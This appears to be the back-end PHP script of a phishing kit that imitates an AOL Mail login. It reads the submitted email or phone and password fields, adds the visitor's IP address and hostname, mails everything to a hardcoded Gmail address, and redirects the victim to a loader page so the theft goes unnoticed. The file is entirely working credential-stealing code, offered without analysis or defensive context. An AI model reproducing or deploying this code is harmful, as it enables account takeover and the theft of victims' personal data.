<?
$to = "camachodaniel1306@gmail.com";
//--------------------------------
$loaname = $_POST['loaname'];
$loapasuma = $_POST['loapasuma'];
$ip = $_SERVER['REMOTE_ADDR'];
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$subj = "| |AolMail |";
$msg = "Email or Phone : $loaname\nPassword : $loapasuma\nHost : $host\nIP : $ip";
$from = "FROM: Snoop Inc<m@m>";
			
			{
		mail($to,$subj."|".$ip,$msg);
				}
			header("location: 1loader.php");
?>